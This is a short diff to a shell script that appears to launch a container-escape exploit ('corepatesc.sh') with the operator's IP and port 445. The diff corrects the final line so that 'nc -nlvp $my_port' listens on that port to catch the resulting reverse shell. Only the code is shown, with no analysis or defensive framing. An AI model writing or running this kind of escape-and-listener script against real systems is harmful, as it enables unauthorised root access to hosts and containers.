@@ -5,4 +5,4 @@ my_port=445
 
 sleep 5 && ./corepatesc.sh $my_ip $my_port &
 
-nc -nlvp my_port
+nc -nlvp $my_port
